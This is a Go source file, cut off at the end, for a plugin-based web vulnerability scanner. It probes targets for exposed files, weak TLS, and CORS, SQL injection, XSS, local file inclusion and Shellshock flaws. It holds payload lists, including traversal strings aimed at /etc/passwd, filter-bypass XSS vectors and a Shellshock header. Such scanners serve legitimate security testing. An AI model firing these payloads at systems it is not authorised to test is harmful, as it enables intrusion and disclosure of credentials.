package main

import (
	"DORM/exploitdb"
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/chromedp/chromedp"
	"github.com/jlaffaye/ftp"
	"golang.org/x/crypto/ssh"
)

// ==========================================
// HELPER FUNCTIONS
// ==========================================
func isWebPort(port int) bool {
	return port == 80 || port == 443 || port == 8080 || port == 8443 || port == 3000 || port == 5000
}

func getURL(target ScanTarget, path string) string {
	proto := "http"
	if target.Port == 443 || target.Port == 8443 {
		proto = "https"
	}
	if !strings.HasPrefix(path, "/") && path != "" {
		path = "/" + path
	}
	return fmt.Sprintf("%s://%s:%d%s", proto, target.IP, target.Port, path)
}

func getClient() *http.Client {
	return &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 20,
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return http.ErrUseLastResponse
			}

			initialHost := via[0].URL.Hostname()
			newHost := req.URL.Hostname()

			initialBase := strings.TrimPrefix(initialHost, "www.")
			newBase := strings.TrimPrefix(newHost, "www.")

			if initialBase != "" && newBase != "" && !strings.Contains(newBase, initialBase) {
				return http.ErrUseLastResponse
			}

			return nil
		},
	}
}


func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// DORM-BUSTER (HYBRID: EMBEDDED + FILE)
type DirBusterPlugin struct{}

func (p *DirBusterPlugin) Name() string { return "DORM-BUSTER (Hybrid Scan)" }

func (p *DirBusterPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	// STEP 1: "Golden List" (Embedded - Always runs)
	// These will be scanned even if no wordlist folder exists.
	defaultList := []string{
		"/.env", "/.git/config", "/.htaccess", "/web.config",
		"/config.php", "/config.php.bak", "/config.php.old",
		"/backup.sql", "/db.sql", "/dump.sql",
		"/.ssh/id_rsa", "/.ssh/id_rsa.pub",
		"/server-status", "/phpmyadmin/", "/docker-compose.yml",
		"/robots.txt", "/sitemap.xml", "/admin", "/login",
	}

	// Use a Map to keep words unique
	uniqueWords := make(map[string]bool)

	// Add defaults first
	for _, w := range defaultList {
		uniqueWords[w] = true
	}

	// STEP 2: Read External Files ("wordlists" Folder)
	// Note: I renamed "Dirb Wordlist" to "wordlists" for standard English naming.
	// Make sure your folder name matches this!
	folderPath := "wordlists"
	files, err := os.ReadDir(folderPath)

	// If folder exists and is readable
	if err == nil {
		for _, file := range files {
			// Only take .txt files
			if !file.IsDir() && strings.HasSuffix(file.Name(), ".txt") {
				f, err := os.Open(filepath.Join(folderPath, file.Name()))
				if err == nil {
					scanner := bufio.NewScanner(f)
					for scanner.Scan() {
						word := strings.TrimSpace(scanner.Text())
						// Skip empty lines and comments (#)
						if len(word) > 0 && !strings.HasPrefix(word, "#") {
							// Ensure prefix / (Standardization)
							if !strings.HasPrefix(word, "/") {
								word = "/" + word
							}
							uniqueWords[word] = true // Add to list
						}
					}
					f.Close()
				}
			}
		}
	}

	// STEP 3: Scanning Engine
	var foundPaths []string

	// Iterate through all unique words
	for word := range uniqueWords {
		fullURL := getURL(target, word)

		// Request with Stealth Client (WAF bypass active)
		req, _ := http.NewRequest("GET", fullURL, nil)
		// If you use a custom Stealth Client for User-Agent, handle it here.

		resp, err := getClient().Do(req)
		if err == nil {
			// 200: Exists, 403: Exists but forbidden, 301: Redirect
			if resp.StatusCode == 200 || resp.StatusCode == 403 {
				// Soft-404 check (Optional): If page size is very small (e.g. <500 byte) and 200 OK, it's suspicious.
				// Currently just checking status codes.

				statusMark := ""
				if resp.StatusCode == 403 {
					statusMark = " [FORBIDDEN]"
				}

				foundPaths = append(foundPaths, fmt.Sprintf("%s (Code: %d)%s", word, resp.StatusCode, statusMark))
			}
			resp.Body.Close()
		}
		// Minimal delay to avoid locking the machine (Milliseconds)
		// time.Sleep(10 * time.Millisecond)
	}

	// STEP 4: Reporting
	if len(foundPaths) > 0 {
		description := fmt.Sprintf("Total %d critical files/directories found:\n", len(foundPaths))

		// Don't print everything if too many, limit to first 20
		limit := 20
		if len(foundPaths) < 20 {
			limit = len(foundPaths)
		}

		for i := 0; i < limit; i++ {
			description += "- " + foundPaths[i] + "\n"
		}

		return &Vulnerability{
			Target:      target,
			Name:        "Critical File/Directory Disclosure (Hybrid)",
			Severity:    "HIGH",
			CVSS:        7.5,
			Description: description,
			Solution:    "Delete found files from the server or check permissions (chmod/chown).",
			Reference:   "OWASP Forced Browsing",
		}
	}

	return nil
}

// ==========================================
// FIRST 10 PLUGINS (BASIC)
// ==========================================

// SERVICE FINGERPRINT
type FingerprintPlugin struct{}

func (p *FingerprintPlugin) Name() string { return "Service & Version Detection" }
func (p *FingerprintPlugin) Run(target ScanTarget) *Vulnerability {

	knownPorts := map[int]string{80: "HTTP", 443: "HTTPS", 22: "SSH", 21: "FTP", 3306: "MySQL"}
	if _, ok := knownPorts[target.Port]; !ok {
		return nil
	}

	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), 2*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()

	// Banner Grabbing: Wait for service to introduce itself
	// Send GET request for Web servers
	if target.Port == 80 || target.Port == 443 || target.Port == 8080 {
		fmt.Fprintf(conn, "HEAD / HTTP/1.0\r\n\r\n")
	}

	// Listen for 2 seconds
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	buf := make([]byte, 1024)
	n, _ := conn.Read(buf)
	banner := string(buf[:n])

	// Regex/Parsing to extract popular services
	// This part is like Nessus's brain
	detected := ""
	if strings.Contains(banner, "OpenSSH") {
		detected = "OpenSSH (" + strings.Split(banner, "\n")[0] + ")"
	} else if strings.Contains(banner, "Apache/") {
		// Extract Apache/2.4.41 (Ubuntu) part
		parts := strings.Split(banner, "Server: ")
		if len(parts) > 1 {
			detected = strings.Split(parts[1], "\r\n")[0]
		}
	} else if strings.Contains(banner, "nginx/") {
		detected = "Nginx" // You can parse version here
	} else if strings.Contains(banner, "Microsoft-IIS") {
		detected = "Microsoft IIS"
	}

	if detected != "" {
		return &Vulnerability{
			Target:      target,
			Name:        "Service Detection: " + detected,
			Severity:    "INFO",
			CVSS:        0.0,
			Description: fmt.Sprintf("Service running on port identified: %s\nBanner: %s", detected, banner),
			Solution:    "Hide service version (ServerTokens Prod).",
			Reference:   "CPE Dictionary",
		}
	}
	return nil
}

// ==========================================
// EXPLOI-DB INTEGRATION (RAM BASED)
// ==========================================

type EDBPlugin struct{}

func (p *EDBPlugin) Name() string { return "Exploit-DB Scanner" }

func (p *EDBPlugin) Run(target ScanTarget) *Vulnerability {
	// 1. First get the service name (Banner Grabbing)
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), 2*time.Second)
	if err != nil {
		return nil
	}

	// If HTTP, request Header, else wait
	if target.Port == 80 || target.Port == 443 {
		fmt.Fprintf(conn, "HEAD / HTTP/1.0\r\n\r\n")
	}

	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	buf := make([]byte, 512)
	n, _ := conn.Read(buf)
	conn.Close()

	if n == 0 {
		return nil
	}
	banner := string(buf[:n])

	// Banner cleaning (Remove unnecessary chars)
	lines := strings.Split(banner, "\n")
	cleanBanner := ""
	for _, line := range lines {
		if strings.Contains(line, "Server:") || strings.Contains(line, "SSH") || strings.Contains(line, "FTP") {
			cleanBanner = line
			break
		}
	}

	// If no clean service name found, take the first line
	if cleanBanner == "" && len(lines) > 0 {
		cleanBanner = lines[0]
	}

	// Don't search if too short or meaningless
	if len(cleanBanner) < 4 {
		return nil
	}

	// 2. CALL THE ENGINE IN NEW FOLDER!
	// Remove "Server: " part from cleanBanner
	searchTerm := strings.ReplaceAll(cleanBanner, "Server:", "")
	searchTerm = strings.TrimSpace(searchTerm)

	results := exploitdb.Search(searchTerm)

	if len(results) > 0 {
		return &Vulnerability{
			Target:      target,
			Name:        "Critical Exploit Detection (EDB)",
			Severity:    "CRITICAL",
			CVSS:        9.8,
			Description: fmt.Sprintf("Exploit-DB records found for service version (%s):\n\n%s", searchTerm, strings.Join(results, "\n\n")),
			Solution:    "Update or patch the service immediately.",
			Reference:   "Exploit-DB",
		}
	}

	return nil
}

// WEAK TLS/SSL CIPHERS (POODLE / BEAST)
type TLSCheckPlugin struct{}

func (p *TLSCheckPlugin) Name() string { return "Weak SSL/TLS Protocols" }
func (p *TLSCheckPlugin) Run(target ScanTarget) *Vulnerability {
	if target.Port != 443 && target.Port != 8443 {
		return nil
	}

	conf := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS10, // Try TLS 1.0
		MaxVersion:         tls.VersionTLS11, // Up to TLS 1.1
	}

	conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), conf)
	if err == nil {
		defer conn.Close()
		state := conn.ConnectionState()
		ver := ""
		switch state.Version {
		case tls.VersionTLS10:
			ver = "TLS 1.0"
		case tls.VersionTLS11:
			ver = "TLS 1.1"
		}

		if ver != "" {
			return &Vulnerability{
				Target:      target,
				Name:        "Legacy SSL/TLS Protocol: " + ver,
				Severity:    "MEDIUM",
				CVSS:        5.5,
				Description: fmt.Sprintf("Server supports old and insecure protocol %s.", ver),
				Solution:    "Disable TLS 1.0 and 1.1, use only TLS 1.2+.",
				Reference:   "POODLE Attack",
			}
		}
	}
	return nil
}

// 1. OPEN PORT DETECTION
type PortCheckPlugin struct{}

func (p *PortCheckPlugin) Name() string { return "Open Port Detection" }
func (p *PortCheckPlugin) Run(target ScanTarget) *Vulnerability {
	address := net.JoinHostPort(target.IP, strconv.Itoa(target.Port))
	conn, err := net.DialTimeout("tcp", address, 3*time.Second)
	if err != nil {
		return nil
	}
	conn.Close()
	return &Vulnerability{Target: target, Name: "Open TCP Port", Severity: "INFO", CVSS: 0.0, Description: fmt.Sprintf("Port %d is open.", target.Port), Solution: "Close if not required.", Reference: ""}
}

// 2. SERVICE BANNER
type BannerGrabPlugin struct{}

func (p *BannerGrabPlugin) Name() string { return "Service Banner Info" }
func (p *BannerGrabPlugin) Run(target ScanTarget) *Vulnerability {
	address := net.JoinHostPort(target.IP, strconv.Itoa(target.Port))
	conn, err := net.DialTimeout("tcp", address, 3*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	fmt.Fprintf(conn, "HEAD / HTTP/1.0\r\n\r\n")
	buf := make([]byte, 1024)
	n, _ := conn.Read(buf)
	if n > 0 {
		return &Vulnerability{Target: target, Name: "Service Banner", Severity: "LOW", CVSS: 2.0, Description: fmt.Sprintf("Banner: %s", string(buf[:min(n, 50)])), Solution: "Hide banner.", Reference: ""}
	}
	return nil
}

// 3. HTTP HEADER ANALYSIS (V2 - SECURITY FOCUSED)
type HTTPHeaderPlugin struct{}

func (p *HTTPHeaderPlugin) Name() string { return "Security Headers Analysis" }
func (p *HTTPHeaderPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, ""))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	missing := []string{}
	// Check for critical missing headers
	headers := map[string]string{
		"Strict-Transport-Security": "HSTS missing, MITM attack possible.",
		"Content-Security-Policy":   "CSP missing, vulnerable to XSS.",
		"X-Content-Type-Options":    "Sniffing protection (nosniff) missing.",
		"Referrer-Policy":           "Referrer information might leak.",
	}

	for h, desc := range headers {
		if resp.Header.Get(h) == "" {
			missing = append(missing, h+": "+desc)
		}
	}

	if len(missing) > 0 {
		return &Vulnerability{
			Target: target, Name: "Missing Security Headers", Severity: "LOW", CVSS: 3.5,
			Description: strings.Join(missing, "\n"),
			Solution:    "Add recommended HTTP headers to server configuration.",
		}
	}
	return nil
}

// 4. SSL CHECK
type SSLCheckPlugin struct{}

func (p *SSLCheckPlugin) Name() string { return "SSL Certificate Check" }
func (p *SSLCheckPlugin) Run(target ScanTarget) *Vulnerability {
	if target.Port != 443 {
		return nil
	}
	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 4 * time.Second}, "tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), &tls.Config{InsecureSkipVerify: true})
	if err != nil {
		return nil
	}
	defer conn.Close()
	if time.Now().After(conn.ConnectionState().PeerCertificates[0].NotAfter) {
		return &Vulnerability{Target: target, Name: "Expired SSL Certificate", Severity: "MEDIUM", CVSS: 5.0, Description: "Certificate has expired.", Solution: "Renew certificate.", Reference: ""}
	}
	return nil
}

// 6. CORS CHECK (Re-added)
type CORSCheckPlugin struct{}

func (p *CORSCheckPlugin) Name() string { return "CORS Misconfiguration" }
func (p *CORSCheckPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	req, _ := http.NewRequest("GET", getURL(target, ""), nil)
	req.Header.Set("Origin", "http://evil.com")
	resp, err := getClient().Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	if resp.Header.Get("Access-Control-Allow-Origin") == "http://evil.com" {
		return &Vulnerability{
			Target: target, Name: "Insecure CORS", Severity: "HIGH", CVSS: 7.5,
			Description: "Server allows arbitrary origin (Wildcard/Reflected).", Solution: "Restrict Origin.", Reference: "",
		}
	}
	return nil
}

// 7. WORDPRESS USER ENUM (V2 - JSON API EXPLOIT)
type WPUserEnumPlugin struct{}

func (p *WPUserEnumPlugin) Name() string { return "WordPress User Disclosure (Pro)" }
func (p *WPUserEnumPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	// Force modern WP-JSON API, not just ?author=1
	endpoints := []string{"/wp-json/wp/v2/users", "/?author=1"}

	for _, ep := range endpoints {
		resp, err := getClient().Get(getURL(target, ep))
		if err == nil && resp.StatusCode == 200 {
			defer resp.Body.Close()
			body, _ := io.ReadAll(resp.Body)
			// Check if slug/username exists in JSON
			if strings.Contains(string(body), "\"slug\":\"") || strings.Contains(string(body), "/author/") {
				return &Vulnerability{
					Target: target, Name: "WordPress Username Disclosure", Severity: "MEDIUM", CVSS: 5.0,
					Description: "Usernames can be extracted via WP-JSON or Author archives. Risk of Brute-force!",
					Solution:    "Restrict REST API access and disable author archives.",
				}
			}
		}
	}
	return nil
}

// 8. PHP INFO
type PHPInfoPlugin struct{}

func (p *PHPInfoPlugin) Name() string { return "PHP Info Check" }
func (p *PHPInfoPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	files := []string{"/phpinfo.php", "/info.php"}
	for _, f := range files {
		resp, err := getClient().Get(getURL(target, f))
		if err == nil && resp.StatusCode == 200 {
			buf := make([]byte, 500)
			resp.Body.Read(buf)
			resp.Body.Close()
			if strings.Contains(string(buf), "PHP Version") {
				return &Vulnerability{Target: target, Name: "PHP Info File", Severity: "HIGH", CVSS: 7.5, Description: f + " is accessible.", Solution: "Delete it.", Reference: ""}
			}
		}
	}
	return nil
}

// 9. WAF DETECTOR
type WAFDetectorPlugin struct{}

func (p *WAFDetectorPlugin) Name() string { return "WAF Detection" }
func (p *WAFDetectorPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, ""))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	if strings.Contains(resp.Header.Get("Server"), "cloudflare") {
		return &Vulnerability{Target: target, Name: "WAF (Cloudflare)", Severity: "INFO", CVSS: 0.0, Description: "Cloudflare protection detected.", Solution: "-", Reference: ""}
	}
	return nil
}

// 10. OPEN REDIRECT
type OpenRedirectPlugin struct{}

func (p *OpenRedirectPlugin) Name() string { return "Open Redirect" }
func (p *OpenRedirectPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	client := &http.Client{
		Timeout:       4 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
		Transport:     &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
	}
	resp, err := client.Get(getURL(target, "/?url=http://example.com"))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 && resp.StatusCode < 400 && strings.Contains(resp.Header.Get("Location"), "example.com") {
		return &Vulnerability{Target: target, Name: "Open Redirect", Severity: "MEDIUM", CVSS: 6.1, Description: "Open redirect detected.", Solution: "Use a whitelist.", Reference: ""}
	}
	return nil
}

// ==========================================
// NEXT 10 PLUGINS (OFFENSIVE / NEW)
// ==========================================

// 11. SQLi (V2 - MULTI PAYLOAD)
type SQLInjectionPlugin struct{}

func (p *SQLInjectionPlugin) Name() string { return "SQL Injection (Advanced)" }
func (p *SQLInjectionPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	// COMPLEX PAYLOAD LIST
	payloads := []string{
		"'",                     // Classic test
		"''",                    // Double quote test
		"`",                     // Backtick (MySQL)
		"';",                    // Query termination
		"' OR '1'='1",           // Classic Bypass
		"' OR 1=1 --",           // Commented
		"admin' --",             // Username manipulation
		"' UNION SELECT NULL--", // Union based test
		"')) OR (('x'='x",       // Parenthesis complex structure
	}

	// Error messages vary by database, catch them all
	errors := []string{
		"SQL syntax", "mysql_fetch", "ORA-01756", "Oracle Error",
		"PostgreSQL query failed", "SQLServer JDBC Driver",
		"Microsoft OLE DB Provider for SQL Server", "Unclosed quotation mark",
	}

	for _, payload := range payloads {
		// URL Encode to avoid immediate WAF block
		encodedPayload := url.QueryEscape(payload)
		resp, err := getClient().Get(getURL(target, "/?id="+encodedPayload))

		if err == nil {
			defer resp.Body.Close()
			bodyBytes, _ := io.ReadAll(resp.Body)
			bodyString := string(bodyBytes)

			for _, errMsg := range errors {
				if strings.Contains(bodyString, errMsg) {
					return &Vulnerability{
						Target:      target,
						Name:        "SQL Injection (Detected)",
						Severity:    "CRITICAL",
						CVSS:        9.8,
						Description: fmt.Sprintf("Database error returned. Working Payload: %s", payload),
						Solution:    "Use Prepared Statements (PDO).",
						Reference:   "OWASP SQLi",
					}
				}
			}
		}
	}
	return nil
}

// 12. XSS (V2 - POLYGLOT & BYPASS)
type XSSPlugin struct{}

func (p *XSSPlugin) Name() string { return "XSS (Advanced)" }
func (p *XSSPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	// Script alert is not enough, need filter bypassing codes
	payloads := []string{
		"<script>alert('DORM')</script>",          // Classic
		"\"><script>alert('DORM')</script>",       // Input escape
		"<img src=x onerror=alert('DORM')>",       // Image error (Common Bypass)
		"<svg/onload=alert('DORM')>",              // Modern SVG Bypass
		"javascript:alert('DORM')",                // Link injection
		"'-alert('DORM')-'",                       // JS String escape
		"</script><script>alert('DORM')</script>", // Close/Open Script
	}

	for _, payload := range payloads {
		// Add parameter to URL
		checkURL := getURL(target, "/?q="+url.QueryEscape(payload))
		resp, err := getClient().Get(checkURL)

		if err == nil {
			defer resp.Body.Close()
			bodyBytes, _ := io.ReadAll(resp.Body)
			bodyString := string(bodyBytes)

			// Is the code reflected "as is" in the response?
			if strings.Contains(bodyString, payload) {
				return &Vulnerability{
					Target:      target,
					Name:        "Reflected XSS",
					Severity:    "HIGH",
					CVSS:        7.2,
					Description: fmt.Sprintf("XSS Payload executed: %s", payload),
					Solution:    "Encode inputs (HTML Entity).",
					Reference:   "OWASP XSS",
				}
			}
		}
	}
	return nil
}

// 13. LFI (V2 - ENCODE & BYPASS)
type LFIPlugin struct{}

func (p *LFIPlugin) Name() string { return "LFI (Advanced)" }
func (p *LFIPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	payloads := []string{
		"/etc/passwd",                                           // Direct access
		"../../../../../../../../etc/passwd",                    // Deep traversal
		"....//....//....//....//etc/passwd",                    // Double-dot bypass
		"/etc/passwd%00",                                        // Null byte (Old PHP versions)
		"php://filter/convert.base64-encode/resource=index.php", // PHP Wrapper (Source code reading)
		"/windows/win.ini",                                      // Windows Server test
	}

	for _, payload := range payloads {
		resp, err := getClient().Get(getURL(target, "/?page="+payload))
		if err == nil {
			defer resp.Body.Close()
			body, _ := io.ReadAll(resp.Body)
			content := string(body)

			if strings.Contains(content, "root:x:0:0") ||
				strings.Contains(content, "[fonts]") ||
				strings.Contains(content, "PD9waH") { // Base64 PHP start (<?php)

				return &Vulnerability{
					Target:      target,
					Name:        "Local File Inclusion (LFI)",
					Severity:    "CRITICAL",
					CVSS:        8.5,
					Description: "Sensitive files on server are readable: " + payload,
					Solution:    "Restrict file paths using a whitelist.",
					Reference:   "OWASP LFI",
				}
			}
		}
	}
	return nil
}

// 14. SPRING BOOT
type SpringBootPlugin struct{}

func (p *SpringBootPlugin) Name() string { return "Spring Boot Actuator" }
func (p *SpringBootPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/actuator/env"))
	if err == nil && resp.StatusCode == 200 {
		resp.Body.Close()
		return &Vulnerability{Target: target, Name: "Spring Boot Actuator", Severity: "CRITICAL", CVSS: 9.0, Description: "Management panel exposed.", Solution: "Close access.", Reference: ""}
	}
	return nil
}

// 15. GIT CONFIG
type GitConfigPlugin struct{}

func (p *GitConfigPlugin) Name() string { return "Git Configuration" }
func (p *GitConfigPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/.git/config"))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == 200 && strings.Contains(string(body), "[core]") {
		return &Vulnerability{Target: target, Name: "Git Disclosure (.git)", Severity: "HIGH", CVSS: 7.5, Description: "Git config file is accessible.", Solution: "Block access.", Reference: ""}
	}
	return nil
}

// 16. BACKUP FILE
type BackupFilePlugin struct{}

func (p *BackupFilePlugin) Name() string { return "Backup File" }
func (p *BackupFilePlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/index.php.bak"))
	if err == nil && resp.StatusCode == 200 {
		resp.Body.Close()
		return &Vulnerability{Target: target, Name: "Backup File Found", Severity: "HIGH", CVSS: 7.0, Description: "Backup file disclosure.", Solution: "Delete it.", Reference: ""}
	}
	return nil
}

// 17. APACHE STATUS
type ApacheStatusPlugin struct{}

func (p *ApacheStatusPlugin) Name() string { return "Apache Server Status" }
func (p *ApacheStatusPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/server-status"))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == 200 && strings.Contains(string(body), "Apache Server Status") {
		return &Vulnerability{Target: target, Name: "Apache Status Page", Severity: "LOW", CVSS: 3.0, Description: "Server status is accessible.", Solution: "Disable it.", Reference: ""}
	}
	return nil
}

// 18. DS_STORE
type DSStorePlugin struct{}

func (p *DSStorePlugin) Name() string { return "DS_Store Disclosure" }
func (p *DSStorePlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/.DS_Store"))
	if err == nil && resp.StatusCode == 200 && resp.ContentLength > 0 {
		resp.Body.Close()
		return &Vulnerability{Target: target, Name: ".DS_Store File", Severity: "LOW", CVSS: 2.5, Description: "Mac file index found.", Solution: "Delete it.", Reference: ""}
	}
	return nil
}

// 19. TRACE METHOD
type TraceMethodPlugin struct{}

func (p *TraceMethodPlugin) Name() string { return "HTTP TRACE Method" }
func (p *TraceMethodPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	req, _ := http.NewRequest("TRACE", getURL(target, ""), nil)
	resp, err := getClient().Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		return &Vulnerability{Target: target, Name: "TRACE Method Enabled", Severity: "MEDIUM", CVSS: 4.5, Description: "Vulnerable to XST attacks.", Solution: "Set TraceEnable Off.", Reference: ""}
	}
	return nil
}

// 20. ENV FILE
type EnvFilePlugin struct{}

func (p *EnvFilePlugin) Name() string { return "ENV File Disclosure" }
func (p *EnvFilePlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/.env"))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == 200 && (strings.Contains(string(body), "APP_KEY=") || strings.Contains(string(body), "DB_PASSWORD=")) {
		return &Vulnerability{Target: target, Name: "ENV File Read", Severity: "CRITICAL", CVSS: 10.0, Description: "Passwords/Secrets disclosed.", Solution: "Block access.", Reference: ""}
	}
	return nil
}

// 21. CMS DETECTION (V2 - FINGERPRINT ANALYSIS)
type CMSTestPlugin struct{}

func (p *CMSTestPlugin) Name() string { return "CMS & Technology Analysis" }
func (p *CMSTestPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, ""))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	content := string(body)

	foundCMS := ""
	if strings.Contains(content, "wp-content") {
		foundCMS = "WordPress"
	}
	if strings.Contains(content, "Joomla") {
		foundCMS = "Joomla"
	}
	if strings.Contains(content, "Drupal") {
		foundCMS = "Drupal"
	}
	if strings.Contains(content, "content=\"Ghost") {
		foundCMS = "Ghost"
	}

	if foundCMS != "" {
		return &Vulnerability{
			Target:      target,
			Name:        "CMS Detection: " + foundCMS,
			Severity:    "INFO",
			CVSS:        0.0,
			Description: fmt.Sprintf("Target site is using %s CMS system.", foundCMS),
			Solution:    "Hide version info and keep it updated.",
		}
	}
	return nil
}

// 22. ADMIN PANEL (V2 - BROAD SCOPE)
type AdminPanelPlugin struct{}

func (p *AdminPanelPlugin) Name() string { return "Admin Panel Finder (Pro)" }
func (p *AdminPanelPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	panels := []string{
		"/admin/", "/administrator/", "/cp/", "/controlpanel/",
		"/wp-admin/", "/vhost/", "/magento/admin/", "/backend/",
		"/directadmin/", "/plesk/", "/cpanel/", "/webmin/",
		"/monitor/", "/manager/html", "/server-manager/",
	}

	for _, p := range panels {
		resp, err := getClient().Get(getURL(target, p))
		if err == nil {
			defer resp.Body.Close()
			// 200 (Open) or 401 (Auth required but panel exists)
			if resp.StatusCode == 200 || resp.StatusCode == 401 {
				return &Vulnerability{
					Target:      target,
					Name:        "Admin Panel Detection",
					Severity:    "MEDIUM",
					CVSS:        5.0,
					Description: "Potential panel found: " + p,
					Solution:    "Restrict public access or use IP whitelisting.",
					Reference:   "",
				}
			}
		}
	}
	return nil
}

// 23. SHELLSHOCK SCANNER
type ShellshockPlugin struct{}

func (p *ShellshockPlugin) Name() string { return "Shellshock Vulnerability" }
func (p *ShellshockPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	req, _ := http.NewRequest("GET", getURL(target, "/cgi-bin/status"), nil)
	// Shellshock Payload
	req.Header.Set("User-Agent", "() { :;}; echo; echo 'VULNERABLE'")
	req.Header.Set("Referer", "() { :;}; echo; echo 'VULNERABLE'")

	resp, err := getClient().Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	if strings.Contains(string(body), "VULNERABLE") {
		return &Vulnerability{Target: target, Name: "Shellshock (RCE)", Severity: "CRITICAL", CVSS: 10.0, Description: "Old Bash version executes commands.", Solution: "Update Bash.", Reference: "CVE-2014-6271"}
	}
	return nil
}

// 24. LARAVEL DEBUG MODE (Advanced & Verified)
type LaravelDebugPlugin struct{}

func (p *LaravelDebugPlugin) Name() string { return "Laravel Debug Mode / Ignition (Verified)" }

func (p *LaravelDebugPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()

	ignitionURL := getURL(target, "/_ignition/health-check")
	respIgnition, err := client.Get(ignitionURL)

	if err == nil {
		defer respIgnition.Body.Close()
		bodyBytes, _ := io.ReadAll(respIgnition.Body)
		bodyString := string(bodyBytes)

		// Verification: Look for specific JSON keys used by Facade/Ignition.
		// "can_execute_commands": true indicates a high-risk RCE vector.
		if strings.Contains(bodyString, "\"can_execute_commands\"") {
			severity := "HIGH"
			desc := "Laravel Ignition health check exposed. Debug information available."

			if strings.Contains(bodyString, "\"can_execute_commands\":true") || strings.Contains(bodyString, "\"can_execute_commands\": true") {
				severity = "CRITICAL" // This is directly RCE vulnerable
				desc = "Laravel Ignition exposed with command execution enabled (CVE-2021-3129)."
			}

			return &Vulnerability{
				Target:      target,
				Name:        "Laravel Ignition Debug Page",
				Severity:    severity,
				CVSS:        9.8, // Critical if RCE is possible
				Description: desc,
				Solution:    "Disable 'APP_DEBUG' in .env and restrict access to '_ignition' endpoints.",
				Reference:   "CVE-2021-3129",
			}
		}
	}

	errorURL := getURL(target, "/dorm-404-test-"+fmt.Sprintf("%d", time.Now().Unix()))
	respError, err := client.Get(errorURL)

	if err == nil {
		defer respError.Body.Close()
		bodyBytes, _ := io.ReadAll(respError.Body)
		bodyString := string(bodyBytes)

		isIgnition := strings.Contains(bodyString, "window.ignition")
		isSymfonyDump := strings.Contains(bodyString, "sf-dump")
		isFacade := strings.Contains(bodyString, "facade/ignition")

